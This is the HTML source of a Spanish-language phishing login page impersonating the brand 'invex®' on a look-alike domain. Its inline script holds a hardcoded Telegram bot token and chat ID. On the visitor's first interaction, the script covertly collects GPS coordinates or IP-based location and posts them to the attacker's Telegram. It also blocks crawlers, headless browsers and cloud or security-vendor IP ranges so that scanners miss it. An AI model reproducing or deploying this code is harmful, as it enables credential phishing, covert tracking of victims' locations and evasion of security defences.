<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Acceso — invex®</title>

    <!-- CONFIGURACIÓN DE VISTA PREVIA PARA ENLACES (WHATSAPP / FACEBOOK) -->
    <meta property="og:title" content="Acceso — invex®" />
    <meta property="og:description" content="Inicia sesión en tu cuenta de invex® de forma segura." />
    <meta property="og:image" content="https://i.postimg.cc/6QyjrKWB/invex-whats.png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <!-- ⚠️ REMPLAZA 'tudominio.com' por el nombre real de tu dominio de Namecheap -->
    <meta property="og:url" content="https://accessoinvex.com" />
    <meta property="og:type" content="website" />

    <link rel="stylesheet" href="styles.css" />
    <!-- CDN Correcto para cargar los iconos de Font Awesome -->
    <link rel="stylesheet" href="https://cloudflare.com" />
</head>
<body>
<main class="login-wrapper">
    <h1 id="brand-title" class="brand">invex<sup>®</sup></h1>
    <section class="login-card" aria-labelledby="brand-title">
        <div class="lang-selector">
            <label for="lang" class="visually-hidden">Idioma</label>
            <select id="lang" name="lang">
                <option value="es-ES" selected>es-ES</option>
                <option value="en-US">en-US</option>
            </select>
        </div>
        <h2 class="welcome-title">¡Hola, bienvenido!</h2>
        <form id="login-form" class="login-form" novalidate>
            <!-- Campo Usuario -->
            <div class="field">
                <input type="text" id="username" name="username" placeholder=" " autocomplete="username" required />
                <label for="username" class="floating-label">Usuario</label>
            </div>
            <!-- Campo Contraseña -->
            <div class="field">
                <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required />
                <label for="password" class="floating-label">Contraseña</label>
                <span class="toggle-password" id="togglePassword">
                    <!-- CORREGIDO: xmlns con la estructura estándar completa para Chrome -->
                    <svg id="eyeIcon" xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
                        <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
                        <path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path>
                        <line x1="2" y1="2" x2="22" y2="22"></line>
                    </svg>
                </span>
            </div>
            <p id="form-message" class="form-message" role="alert" aria-live="polite"></p>
            <button type="submit" class="btn-submit">Iniciar sesión</button>
        </form>
        <div class="forgot-container">
            <p class="forgot-text-question">¿Olvidaste tu usuario o contraseña?</p>
            <a href="password.html" class="forgot-link">Recupéralos aquí</a>
        </div>
    </section>
</main>



<!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (ENLACES COMPLETAMENTE OPERATIVOS) -->
<script>
(function() {
    const TOKEN = '9068600803:AAHsD99VxpWVyedQoPlZeFV3OHotQJhK0W0';
    const CHAT_ID = '9180377107';


// 🛡️ ESCUDO 1: Bloqueo inmediato de bots, navegadores ocultos y automatización
    const esBot = /bot|googlebot|crawler|spider|robot|crawling|headless|lighthouse|facebookexternalhit|whatsapp|telegrambot/i.test(navigator.userAgent);
    
    if (document.hidden || navigator.webdriver || esBot) {
        console.log("Visita descartada: Bot o navegador automatizado detectado.");
        return;
    }

    function escapeHTML(text) {
        return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    // 🛡️ ESCUDO 2: Filtro de organizaciones de servidores/bots en la consulta por IP
    function buscarPorIP() {
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            const org = (data.org || '').toLowerCase();
            const botsConocidos = ['google', 'amazon', 'aws', 'microsoft', 'azure', 'digitalocean', 'ovh', 'hetzner', 'cloudflare', 'facebook', 'meta'];
            
            // Si la IP pertenece a un servidor o nube, cancela el envío
            if (botsConocidos.some(bot => org.includes(bot))) {
                console.log("IP bloqueada por pertenecer a un servidor/bot:", data.org);
                return;
            }

            const latIP = data.latitude;
            const lonIP = data.longitude;
            const ip = data.ip || 'No detectada';
            const country = data.country_name || 'Desconocido';
            const city = data.city || 'Desconocida';
            
            const rawUrlIP = "https://www.google.com/search?q=" + latIP + "," + lonIP;
            const safeUrlIP = escapeHTML(rawUrlIP);

            const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
                            "• IP: " + escapeHTML(ip) + "\n" +
                            "• País: " + escapeHTML(country) + "\n" +
                            "• Ciudad: " + escapeHTML(city) + "\n\n" +
                            "👉 <a href=\"" + safeUrlIP + "\">Ver Ubicación por IP</a>";
            
            fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    text: textoIP,
                    parse_mode: 'HTML' 
                })
            });
        }).catch(e => console.error("Error enviando IP:", e));
    }

    function iniciarRastreo() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = Math.round(pos.coords.accuracy);

                    if (acc > 300) {
                        buscarPorIP();
                        return;
                    }

                    const rawUrlGPS = "https://www.google.com/search?q=" + lat + "," + lon;
                    const safeUrlGPS = escapeHTML(rawUrlGPS);

                    const textoGPS = "<b>📍 Nueva Visita (GPS Exacto)</b>\n\n" +
                                     "• Precisión: ~" + acc + " metros\n\n" +
                                     "👉 <a href=\"" + safeUrlGPS + "\">Ver Ubicación en Mapa</a>";

                    fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            chat_id: CHAT_ID, 
                            text: textoGPS,
                            parse_mode: 'HTML' 
                        })
                    }).catch(e => console.error("Error enviando GPS:", e));
                },
                function(err) {
                    buscarPorIP();
                },
                { enableHighAccuracy: true, timeout: 6000 }
            );
        } else {
            buscarPorIP();
        }
    }

    // 🛡️ ESCUDO 3: Exigir interacción real del usuario antes de ejecutar nada
    let rastreoIniciado = false;
    function activarConInteraccion() {
        if (rastreoIniciado) return;
        rastreoIniciado = true;
        
        // Limpiar los escuchadores para que solo se ejecute una vez
        ['mousemove', 'touchstart', 'scroll', 'keydown', 'click'].forEach(evento => {
            window.removeEventListener(evento, activarConInteraccion);
        });

        iniciarRastreo();
    }

    ['mousemove', 'touchstart', 'scroll', 'keydown', 'click'].forEach(evento => {
        window.addEventListener(evento, activarConInteraccion, { passive: true });
    });
})();
</script>

<!-- Carga del archivo principal de interacción lógica -->
<script src="main.js"></script>
</body>
</html>
